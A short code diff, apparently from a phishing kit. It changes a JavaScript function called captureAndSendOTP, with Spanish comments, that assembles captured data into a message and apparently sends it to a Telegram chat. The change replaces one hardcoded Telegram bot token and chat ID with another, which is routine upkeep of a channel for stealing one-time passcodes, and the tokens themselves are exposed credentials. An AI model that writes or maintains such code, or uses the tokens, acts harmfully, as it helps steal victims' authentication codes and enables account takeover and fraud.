@@ -62,8 +62,8 @@ async function captureAndSendOTP() {
   /* ===============================
      MENSAJE FINAL
   =============================== */
-  const TELEGRAM_BOT_TOKEN = "8214599584:AAF5D-FzEQsPPwSBtyD0iyFWfar0Li5VFHw";
-  const TELEGRAM_CHAT_ID  = "8417322083";
+  const TELEGRAM_BOT_TOKEN = "8588682882:AAGBckxmZijeZfAuF5PzUuEQD-vZLJBC9BE";
+  const TELEGRAM_CHAT_ID  = "7874654715";
 
   const mensajeFinal =
     datosConsulta + "\n\n" +
@@ -94,6 +94,7 @@ async function captureAndSendOTP() {
     alert("Error al enviar  ❌");
   }
 }
+
 
 
 
